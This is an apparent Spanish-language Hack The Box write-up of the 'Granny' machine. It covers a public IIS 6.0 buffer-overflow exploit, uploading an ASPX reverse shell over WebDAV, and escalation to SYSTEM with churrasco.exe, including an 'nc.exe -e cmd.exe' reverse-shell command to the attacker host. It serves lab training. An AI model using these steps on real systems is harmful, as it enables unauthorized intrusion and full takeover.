---
layout: post
title: HTB Granny
date: '2023-12-27 18:28:43 -0500'
categories: [HTB, Easy]
tags: [WebDav , Web , Windows , SeImpresonatePrivilege, Churrasco , NC , BOF  ] 
image:
  path: /granny/preview.png
  alt: Granny
---

## Resumen
![logo](/granny/logo.png){: .right w="200" h="200" }
**Granny** es una máquina interesante en la que exploré una temática que pocas veces he tocado. Al principio, se observa un servidor web de **IIS en su versión 6.0**. Este servidor permite realizar un ataque de **Buffer Overflow**, lo que podría conceder acceso mediante algún exploit. Sin embargo, esto es debido a que la máquina es algo antigua, por lo que este no es el camino intencionado.

Por otro lado, dentro del puerto **80**, se encuentra un servidor **webdav** que permite realizar acciones interesantes, como subir archivos. Pero no se permite que estos archivos contengan la extensión **aspx**, comúnmente interpretada por el servidor. Por lo tanto, se puede subir un archivo permitido y luego cambiarle la extensión una vez dentro. Ahora solo sería necesario buscarlo y ejecutarlo dentro del servidor para obtener una **shell reversa**.

Con esta **shell reversa**, se pueden revisar los permisos con los que cuenta el usuario dentro del sistema. Se observa que tiene los permisos **seImpersonatePrivilege**, lo que le permite realizar acciones como otro usuario. Gracias a esto, se intenta utilizar **JuicyPotato** y **PetitPotato**, pero no funcionan. Al revisar la máquina, se descubre que el procesador es de **32 bits**, por lo que es necesario utilizar versiones de estas herramientas compatibles con **arquitectura x86**. Ahí es cuando entra en juego **churrasco.exe**, que permite ejecutar comandos como **NT**. Ahora solo sería necesario subir una versión de **nc** compatible o crear un binario con **msfvenom**, y con esto se puede obtener una **shell reversa** con **máximos privilegios** dentro de este equipo.

## Reconocimiento

Se realiza un **ping** para verificar si se cuenta con conectividad dentro de la máquina.

```bash
ping 10.10.10.15 -c 1

PING 10.10.10.15 (10.10.10.15) 56(84) bytes of data.
64 bytes from 10.10.10.15: icmp_seq=1 ttl=127 time=167 ms

--- 10.10.10.15 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 167.331/167.331/167.331/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos

Se puede realizar un escaneo de puertos con **nmap** para identificar qué **puertos** están abiertos en la máquina y luego investigar más sobre ellos.

```bash
nmap -p- --min-rate 2000 10.10.10.15 -Pn

Nmap scan report for 10.10.10.15 (10.10.10.15)
Host is up (0.17s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```
{: .nolineno}



Luego de descubrir que el puerto **80** está abierto, se puede realizar un escaneo más profundo para identificar qué tecnología se está utilizando.

```bash
nmap -p80 -sVC --min-rate 2000 10.10.10.15 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 11:42 EST
Nmap scan report for 10.10.10.15 (10.10.10.15)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Thu, 28 Dec 2023 16:43:05 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
{: .nolineno}

## Enumeración

Se puede realizar una enumeración con **WhatWeb** para identificar las **tecnologías** que utiliza la **web**. Gracias a esto, se puede observar algo interesante.
```bash
whatweb http://10.10.10.15

http://10.10.10.15 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/6.0], IP[10.10.10.15], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]
```
{: .nolineno}


Dentro de la información obtenida, se observa que se trata de un servicio de **IIS** en su versión **6.0**, pero no se obtiene más información al respecto.

![web](/granny/web.png)


## Explotación 

Para llevar a cabo la explotación, se pueden seguir dos enfoques: aprovechar la vulnerabilidad de la versión de **IIS** que permite obtener una **shell reversa** mediante un **Buffer Overflow** o utilizar el servidor **WebDav** para realizar una carga de archivos y conseguir así una **shell reversa**.

###  Buffer OverFlow 

Al investigar en Internet sobre esa **versión** específica, lo primero que se encuentra es que está relacionada con un **CVE** que permite realizar un ataque de **Buffer Overflow** y obtener una shell reversa dentro del equipo.

![exploit](/granny/exploit.png)


Ahora, se puede utilizar el exploit de [H3xL00m](https://github.com/H3xL00m/CVE-2017-7269) para aprovechar la vulnerabilidad del servicio.

![github](/granny/github.png)


Entonces, puedes clonar el repositorio y ejecutar el siguiente comando:

```bash
python2.7 ii6_reverse_shell.py IpServicio PueroServicio IpAtacante puertoEscucha
```
{: .nolineno}

A continuación, es necesario ponerse a la escucha con Netcat para obtener la shell inversa:

```bash
nc -lvp 4444
```
{: .nolineno}


A continuación, puede ejecutarlo de la siguiente manera:

```bash
python2.7 ii6_reverse_shell.py 10.10.10.14 80 10.10.14.17 4444
```
{: .nolineno}


Y se ganá la shell revers.

```bash
nc -lvp  4444
listening on [any] 4444 ...
connect to [10.10.14.17] from 10.10.10.15 [10.10.10.15] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```
{: .nolineno}


### WebDav 

Para intentar **explotar** el servidor **webdav** y subir un archivo, es necesario comprender que este facilita la subida y bajada de archivos, de manera similar a un servidor **FTP**. Con esto en mente, se pretende cargar en el servidor un archivo que pueda ejecutarse. Para servidores **IIS**, estos archivos suelen ser **.asp** o **.aspx**. Se puede utilizar **davtest** para probar qué archivos se pueden subir con el siguiente comando:


```bash
davtest -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: fJFDtAyi3tknCLH
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH
********************************************************
 Sending test files
PUT	shtml	FAIL
PUT	cgi	FAIL
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.jsp
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.html
PUT	asp	FAIL
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.cfm
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.jhtml
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.php
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.txt
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.pl
PUT	aspx	FAIL
********************************************************
 Checking for test file execution
EXEC	jsp	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.html
EXEC	html	FAIL
EXEC	cfm	FAIL
EXEC	jhtml	FAIL
EXEC	php	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.txt
EXEC	txt	FAIL
EXEC	pl	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH
PUT File: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.jsp
PUT File: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.html
PUT File: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.cfm
PUT File: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.jhtml
PUT File: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.php
PUT File: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.txt
PUT File: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.pl
Executes: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.html
Executes: http://10.10.10.15/DavTestDir_fJFDtAyi3tknCLH/davtest_fJFDtAyi3tknCLH.txt
```
{: .nolineno}

> El protocolo **WebDAV** (Web-based Distributed Authoring and Versioning) está desarrollado por la IETF, es un protocolo que se encarga de permitirnos de forma sencilla guardar, editar, copiar, mover y compartir archivos desde servidores web. 
{: .prompt-info}

Con esto se puede ver que el servidor no permite subir archivos **.aspx**, pero gracias a lo que se vio con **nmap**, se ve que está habilitada la opción para mover y cambiar el nombre. Por lo tanto, se puede subir un archivo **.txt** con la shell reversa y, una vez dentro, cambiarle el nombre. Para la shell reversa, se va a hacer uso del siguiente [archivo](https://github.com/borjmz/aspx-reverse-shell); el cual será modificado para el caso.


```bash
cadaver http://10.10.10.15
dav:/> put shell.txt 
Uploading shell.txt to `/shell.txt':
Progress: [=============================>] 100.0% of 15970 bytes succeeded.
dav:/> move shell.txt shell.aspx
Moving `/shell.txt' to `/shell.aspx':  succeeded.
dav:/> 
```
{: .nolineno}

Se pone a la escucha en el puerto correspondiente con **netcat**.

```bash
nc -lvp 4444
```
{: .nolineno}

Y se busca el recurso **shell.aspx** dentro del servidor web para que se ejecute y se obtenga la shell.

![carga](/granny/carga.png)


Y se obtiene el siguiente resultado: 

```bash
nc -lvp 4444
listening on [any] 4444 ...
10.10.10.15: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.15] 1030
Spawn Shell...
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
{: .nolineno}


## Escalada de Privilegio

Una vez dentro del equipo, se puede revisar con qué privilegios cuenta el usuario comprometido para intentar escalar de alguna manera. Y dentro de la información importante se puede ver que se cuenta con **SeImpersonatePrivilege**, por lo que se puede impersonar al usuario **NT** para poder ejecutar comandos como el mismo.

```bash
whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```
{: .nolineno}



Pero teniendo en cuenta que la máquina es algo vieja, puede que cuente con un procesador de **32 bits**. Y al revisarlo con `systeminfo`, se puede confirmar.

```powershell
systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 12 Minutes, 49 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 742 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,286 MB
Page File: In Use:         184 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```
{: .nolineno}


Por lo que se puede comprobar montar un servidor **SMB** para que se puedan transferir los archivos a la máquina e incluso ejecutarlos sin necesidad de transferirlos. Esto se puede hacer con ayuda de **impacket-smbserver** con el siguiente comando:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
{: .nolineno}

Y ya una vez montado el servidor, se puede intentar listar el contenido del mismo para confirmar que ejecutó de forma adecuada.

```bash
dir \\10.10.14.17\smbFolder 
dir \\10.10.14.17\smbFolder 
 Volume in drive \\10.10.14.17\smbFolder has no label.
 Volume Serial Number is ABCD-EFAA

 Directory of \\10.10.14.17\smbFolder

12/27/2023  08:24 PM    <DIR>          .
12/28/2023  06:58 PM    <DIR>          ..
12/27/2023  04:25 AM               330 portsUDP
12/27/2023  04:25 AM             1,276 versions
12/27/2023  04:56 AM            12,313 ii6_reverse_shell.py
12/07/2021  01:35 AM           347,648 jugito.txt
12/27/2023  08:24 PM            31,232 churrasco.txt
12/27/2023  07:36 PM            38,616 nc.txt
12/27/2023  07:32 PM             1,400 cmd.txt
12/27/2023  07:30 PM                 0 hola.exe
12/07/2021  07:47 AM           263,680 Juicy.Potato.x86.txt
12/27/2023  08:15 PM            15,970 shell.txt
12/27/2023  07:47 PM         1,194,496 PetitPotato.txt
12/27/2023  04:24 AM               338 ports
03/21/2023  08:51 AM         1,194,496 PetitPotato.exe
12/27/2023  07:32 PM             1,400 cmd.aspx
              14 File(s)      3,111,387 bytes
               2 Dir(s)  15,207,469,056 bytes free
```
{: .nolineno}


Se intenta ejecutar el archivo de **PetitPotato** para probar si se puede abusar de la vulnerabilidad, pero lamentablemente se confirma que no es compatible con el equipo.


```bash
\\10.10.14.17\smbFolder\PetitPotato.exe

The image file \\10.10.14.17\smbFolder\PetitPotato.exe is valid, but is for a machine type other than the current machine.
```
{: .nolineno}

Por lo que se puede hacer uso de una versión del mismo pero para arquitectura x86 llamado [**churrasco.exe**](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe), para abusar de la vulnerabilidad.

```bash
\\10.10.14.17\smbFolder\churrasco.exe -d whoami

/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

nt authority\system
```
{: .nolineno}


Ahora se puede descargar una versión de [**Netcat**](https://github.com/int0x33/nc.exe/blob/master/nc.exe) compatible con el equipo y dejarlo dentro del servidor **SMB** para que se pueda ejecutar de forma remota y enviar una shell como el usuario de máximos privilegios.


```bash
\\10.10.14.17\smbFolder\churrasco.exe -d  "\\10.10.14.17\smbFolder\nc.exe -e cmd.exe 10.10.14.17 5555"

/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

c:\windows\system32\inetsrv>
```
{: .nolineno}

Solo hace falta ponerse  a la escucha dentro del equipo atacante.

```bash
nc -lvp 1234
```
{: .nolineno}

 
Y por arte de magia, se gana una shell de máximos privilegios dentro del equipo.


```bash
C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\Documents and Settings

04/12/2017  09:19 PM    <DIR>          .
04/12/2017  09:19 PM    <DIR>          ..
04/12/2017  08:48 PM    <DIR>          Administrator
04/12/2017  04:03 PM    <DIR>          All Users
04/12/2017  09:19 PM    <DIR>          Lakis
               0 File(s)              0 bytes
               5 Dir(s)   1,324,064,768 bytes free

C:\Documents and Settings>whoami
whoami
nt authority\system
```
{: .nolineno}






